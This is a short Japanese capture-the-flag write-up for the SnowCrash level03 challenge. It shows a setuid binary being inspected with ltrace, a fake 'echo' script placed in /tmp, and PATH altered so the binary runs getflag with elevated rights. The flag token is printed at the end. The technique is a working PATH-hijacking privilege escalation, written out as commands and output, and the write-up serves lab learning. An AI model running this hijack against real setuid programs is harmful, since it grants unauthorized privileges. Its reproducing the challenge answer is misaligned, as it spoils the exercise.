
```sh
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```

実行してみる

```sh
level03@SnowCrash:~$ ./level03
Exploit me
```

level03の実行ファイルがあるので、中身を見る

```sh
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7e4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                                                                   = 2003
geteuid()                                                                                                                                   = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                         = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                      = 0
+++ exited (status 0) +++
```

/usr/bin/env echo Exploit me"Exploit me が実行されている


偽のechoを作成して、PATHを変更する

```sh
echo '#!/bin/sh' > /tmp/echo
echo 'getflag' >> /tmp/echo
chmod +x /tmp/echo
```

```sh
export PATH=/tmp:$PATH
```

答えが見える

```sh
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
